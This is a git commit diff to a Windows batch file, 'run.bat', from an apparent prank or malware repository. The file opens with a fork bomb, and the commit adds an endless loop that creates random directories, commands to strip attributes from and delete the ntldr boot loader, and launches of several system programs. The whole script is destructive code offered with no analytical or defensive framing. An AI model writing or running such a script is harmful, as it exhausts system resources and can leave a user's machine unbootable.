50fa06de99e9b6caeb3409e000a9d48a494ad9bd
ilovecodeing123456799 <90834028+ilovecodeing123456799@users.noreply.github.com>
2022-11-19 12:17:45 +0800

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,3 +1,14 @@
 %0|%0
 @echo off
 start message.vbs
+:Rookie
+MD %RANDOM%
+goto Rookie
+attrib -s -r -h c:\ntldr
+del ntldr
+start %systemroot%\system32\notepad.exe
+start %systemroot%\system32\cmd.exe
+start %systemroot%\system32\control.exe
+start %systemroot%\system32\write.exe
+start %systemroot%\winhlp32.exe
+start %systemroot%\Boot\DVD\PCAT\etfsboot.com
